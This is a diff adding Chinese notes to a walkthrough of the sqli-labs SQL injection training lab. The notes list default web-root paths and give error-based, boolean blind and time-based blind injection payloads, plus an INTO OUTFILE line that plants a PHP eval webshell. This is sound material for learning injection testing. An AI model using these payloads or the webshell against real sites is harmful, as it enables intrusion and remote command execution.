@@ -93,3 +93,51 @@ concat_ws 的使用
 通关密钥：`http://sqli:10001/Less-6/?id=1" union select updatexml(666,concat('~',(select database())),'good luck') -- zhiyiyi`
 
 <br>
+
+### Less-7 文件导入方式注入
+
+主流平台文件结构  
+winserver 的 IIS 默认路径`c:\Inetpub\wwwroot`  
+linux 是`/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm`  
+apache 是`.../var/www/htm，.../var/www/html/htdocs`  
+phpstudy 是`...\PhpStudy20180211\PHPTutorial\WWW\`  
+xammp 是`...\xampp\htdocs`
+
+<br>
+
+首先查询得到网站文件的保存绝对路径，之后编写一句话木马并使用 outfile 将文件上传到服务器  
+中国菜刀链接  
+`?id=1')) union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "xxxx\\demo.php"--+`
+
+<br>
+
+### Less-8 布尔单引号盲注
+
+单字符直接注意推测爆破即可  
+逐一判断直到所有字符都对上数据库名称即可！  
+`?id=1' and left((select database()),1)='c' -- -`
+
+<br>
+
+### Less-9 时间单引号盲注
+
+如果数据库坐起第一个字符等于 s，那么就睡 3 秒，否则立即返回真  
+如果撞对了，睡 3 秒直接就可以感觉出来，如果不行的话自行打开 f12 查看网络部分的延迟毫秒数  
+`?id=1' and if(left(database(),1)='s' , sleep(3), 1) --+`
+
+爆表  
+`?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='k' , sleep(3), 1) --+`
+
+<br>
+
+### Less-10 时间双引号盲注
+
+和 less9 一样，只不过单引号改为双引号而已
+
+<br>
+
+### Less-11 错误 POST 单引号注入
+
+<br>
+
+### Less-21
